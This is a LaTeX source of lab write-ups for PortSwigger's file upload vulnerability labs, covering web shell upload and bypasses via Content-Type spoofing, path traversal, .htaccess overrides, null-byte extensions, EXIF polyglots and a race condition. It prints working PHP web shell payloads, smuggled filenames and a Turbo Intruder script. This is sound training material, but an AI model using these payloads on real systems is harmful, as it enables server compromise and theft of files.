\documentclass[11pt,a4paper]{article}

% ----------------------------------
% Packages
% ----------------------------------
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[a4paper,top=2.1cm,bottom=2.1cm,left=2.25cm,right=2.25cm]{geometry}
\usepackage{xcolor}
\usepackage{hyperref}
\usepackage{enumitem}
\usepackage{booktabs}
\usepackage{array}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{listings}

% ----------------------------------
% Document information
% ----------------------------------
\newcommand{\DocumentType}{Lab Writeups}
\newcommand{\VulnerabilityTitle}{File Upload Vulnerabilities}
\newcommand{\SourceName}{PortSwigger Web Security Academy}
\newcommand{\SourceURL}{https://portswigger.net/web-security/file-upload}
\newcommand{\AuthorName}{Youssef Reda}

% ----------------------------------
% Colors and hyperlinks
% ----------------------------------
\definecolor{primary}{RGB}{25,55,95}
\definecolor{secondary}{RGB}{75,95,120}
\definecolor{linkblue}{RGB}{35,85,155}
\definecolor{codegray}{RGB}{95,95,95}
\definecolor{codebg}{RGB}{247,248,250}
\definecolor{codeframe}{RGB}{210,216,224}
\lstset{
    basicstyle=\ttfamily\small,
    backgroundcolor=\color{codebg},
    frame=single,
    rulecolor=\color{codeframe},
    framesep=7pt,
    xleftmargin=4pt,
    xrightmargin=4pt,
    aboveskip=8pt,
    belowskip=8pt,
    breaklines=true,
    breakatwhitespace=false,
    columns=fullflexible,
    keepspaces=true,
    showstringspaces=false,
    tabsize=2
}

\hypersetup{
    colorlinks=true,
    linkcolor=primary,
    urlcolor=linkblue,
    citecolor=primary,
    pdftitle={\VulnerabilityTitle\space - \DocumentType},
    pdfauthor={\AuthorName}
}

\urlstyle{same}

% ----------------------------------
% Paragraphs, lists, and headings
% ----------------------------------
\setlength{\parindent}{0pt}
\setlength{\parskip}{4pt}
\setlist[itemize]{leftmargin=1.5em,itemsep=2pt,topsep=3pt}
\setlist[enumerate]{leftmargin=1.8em,itemsep=2pt,topsep=3pt}
\titleformat{\section}{\Large\bfseries\color{primary}}{}{0pt}{}
\titleformat{\subsection}{\large\bfseries\color{secondary}}{}{0pt}{}
\titleformat{\subsubsection}{\normalsize\bfseries}{}{0pt}{}
\titlespacing*{\section}{0pt}{16pt}{6pt}
\titlespacing*{\subsection}{0pt}{11pt}{4pt}
\titlespacing*{\subsubsection}{0pt}{8pt}{3pt}

% Unnumbered headings that still appear in the Table of Contents.
\newcommand{\nsection}[1]{%
    \section*{#1}%
    \phantomsection%
    \addcontentsline{toc}{section}{#1}%
}
\newcommand{\nsubsection}[1]{%
    \subsection*{#1}%
    \phantomsection%
    \addcontentsline{toc}{subsection}{#1}%
}
\newcommand{\nsubsubsection}[1]{%
    \subsubsection*{#1}%
    \phantomsection%
    \addcontentsline{toc}{subsubsection}{#1}%
}

% ----------------------------------
% Header and footer
% ----------------------------------
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small\textcolor{secondary}{Web Security Notes}}
\fancyhead[R]{\small\textit{File Upload Labs}}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0pt}
\setlength{\headheight}{14pt}

\begin{document}

% ----------------------------------
% Cover page
% ----------------------------------
\begin{titlepage}
    \thispagestyle{empty}
    \centering
    \vspace*{1.8cm}
    {\Large\color{secondary}\bfseries \DocumentType\par}
    \vspace{1.2cm}
    {\Huge\bfseries\color{primary}\VulnerabilityTitle\par}
    \vspace{0.8cm}
    {\large PortSwigger Web Security Academy --- Lab Solutions\par}
    \vfill
    \begin{flushleft}
        \textbf{Prepared by}\par
        \AuthorName
    \end{flushleft}
\end{titlepage}

% ----------------------------------
% Contents
% ----------------------------------
\pagenumbering{roman}
\tableofcontents
\clearpage
\pagenumbering{arabic}

% ----------------------------------
% Lab solutions
% ----------------------------------

\nsection{Lab: Remote Code Execution via Web Shell Upload}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter} and locate the avatar upload function.
    \item Upload an arbitrary image, then return to the account page.
    \item In Burp, open \textbf{Proxy > HTTP history}, filter by image MIME type, and identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request. Send it to Repeater.
    \item Create \texttt{exploit.php} with the following payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Upload \texttt{exploit.php} using the avatar upload function.
    \item In Repeater, change the GET request path to:
          \begin{lstlisting}
GET /files/avatars/exploit.php HTTP/1.1
\end{lstlisting}
    \item Send the request, retrieve Carlos's secret from the response, and submit it in the lab banner.
\end{enumerate}

\nsection{Lab: Web Shell Upload via Content-Type Restriction Bypass}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
    \item In Burp Proxy history, identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request and send it to Repeater.
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Attempt to upload the PHP file and note that the server only allows \texttt{image/jpeg} or \texttt{image/png} MIME types.
    \item Find the \texttt{POST /my-account/avatar} request in Proxy history and send it to Repeater.
    \item In the file part of the request body, change the \texttt{Content-Type} header to \texttt{image/jpeg}.
    \item Send the modified request and confirm that the file is uploaded successfully.
    \item In the GET request tab, replace the image filename with \texttt{exploit.php} and send the request.
    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
\end{enumerate}

\newpage
\nsection{Lab: Web Shell Upload via Path Traversal}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
    \item Identify the \texttt{GET /files/avatars/\textless YOUR-IMAGE\textgreater} request in Burp Proxy history and send it to Repeater.
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Upload the PHP file and request it through Repeater using \texttt{/files/avatars/exploit.php}. Observe that its source is returned as plain text.
    \item Find the \texttt{POST /my-account/avatar} upload request in Proxy history and send it to Repeater.
    \item In the file part, change the filename to:
          \begin{lstlisting}
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
\end{lstlisting}
    \item Send the request and observe that the traversal sequence is stripped from the filename.
    \item URL-encode the forward slash and change the filename to:
          \begin{lstlisting}
filename="..%2fexploit.php"
\end{lstlisting}
    \item Send the request again and confirm that the response reflects the decoded traversal path.
    \item Return to the account page. In Proxy history, find the GET request for \texttt{/files/avatars/..\%2fexploit.php} and inspect its response.
    \item Retrieve Carlos's secret and submit it in the lab banner. The uploaded file can also be requested as \texttt{/files/exploit.php}.
\end{enumerate}

\newpage
\nsection{Lab: Web Shell Upload via Extension Blacklist Bypass}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
    \item Identify the avatar GET request in Burp Proxy history and send it to Repeater.
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Attempt to upload the PHP file and note that the server blocks the \texttt{.php} extension.
    \item Find the \texttt{POST /my-account/avatar} request. Confirm from the response headers that the server is Apache, then send the request to Repeater.
    \item In the file part of the request, make these changes:
          \begin{itemize}
              \item Set the filename to \texttt{.htaccess}.
              \item Set the Content-Type to \texttt{text/plain}.
              \item Replace the file contents with:
                    \begin{lstlisting}
AddType application/x-httpd-php .l33t
\end{lstlisting}
          \end{itemize}
    \item Send the request to upload the \texttt{.htaccess} file.
    \item Return to the original PHP upload request and change the filename from \texttt{exploit.php} to \texttt{exploit.l33t}. Send the request.
    \item In the avatar GET request, replace the image filename with \texttt{exploit.l33t} and send it.
    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
\end{enumerate}

\newpage
\nsection{Lab: Web Shell Upload via Obfuscated File Extension}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
    \item Identify the avatar GET request in Burp Proxy history and send it to Repeater.
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Attempt to upload the PHP file and note that the server only allows JPG and PNG files.
    \item Find the \texttt{POST /my-account/avatar} request and send it to Repeater.
    \item In the file part, change the filename to include an encoded null byte followed by a JPG extension:
          \begin{lstlisting}
filename="exploit.php%00.jpg"
\end{lstlisting}
    \item Send the request and confirm that the response identifies the uploaded file as \texttt{exploit.php}.
    \item In the avatar GET request, replace the image filename with \texttt{exploit.php} and send it.
    \item Retrieve Carlos's secret from the response and submit it in the lab banner.
\end{enumerate}

\nsection{Lab: Remote Code Execution via Polyglot Web Shell Upload}

\begin{enumerate}
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Log in using \texttt{wiener:peter} and attempt to upload the PHP file as your avatar. Confirm that non-image files are blocked.
    \item Create a PHP/JPG polyglot by embedding the payload in the image's metadata using ExifTool:
          \begin{lstlisting}[language=bash]
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
\end{lstlisting}
    \item Upload \texttt{polyglot.php} as your avatar and return to the account page.
    \item In Burp Proxy history, find the \texttt{GET /files/avatars/polyglot.php} request and inspect its response.
    \item Search the response body for \texttt{START} and read Carlos's secret between the \texttt{START} and \texttt{END} markers.
    \item Submit the secret in the lab banner.
\end{enumerate}

\newpage
\nsection{Lab: Web Shell Upload via Race Condition}

\begin{enumerate}
    \item Log in using \texttt{wiener:peter}, upload an image as your avatar, and return to the account page.
    \item Identify the avatar GET request in Burp Proxy history.
    \item Create \texttt{exploit.php} with the payload:
          \begin{lstlisting}[language=PHP]
<?php echo file_get_contents('/home/carlos/secret'); ?>
\end{lstlisting}
    \item Attempt to upload the PHP file and confirm that normal validation blocks it.
    \item Install the Turbo Intruder extension from the Burp BApp Store if it is not already installed.
    \item Right-click the \texttt{POST /my-account/avatar} request in Proxy history and select \textbf{Extensions > Turbo Intruder > Send to turbo intruder}.
    \item Use the following script template in Turbo Intruder, replacing the placeholders with the complete POST upload request and the GET request for \texttt{/files/avatars/exploit.php}:
          \begin{lstlisting}[language=Python]
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''
    request2 = '''<YOUR-GET-REQUEST>'''

    # The 'gate' argument blocks the final byte of each request until openGate is invoked.
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Release all queued requests together.
    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
\end{lstlisting}
    \item Replace \texttt{<YOUR-POST-REQUEST>} with the full POST request containing \texttt{exploit.php}.
    \item Replace \texttt{<YOUR-GET-REQUEST>} with the GET request for \texttt{/files/avatars/exploit.php}.
    \item Click \textbf{Attack}. Turbo Intruder sends the upload request followed by five GET requests.
    \item Inspect the results for a GET response with status \texttt{200} containing Carlos's secret. This request reached the file before validation failed and the file was deleted.
    \item Submit the secret in the lab banner.
\end{enumerate}

\end{document}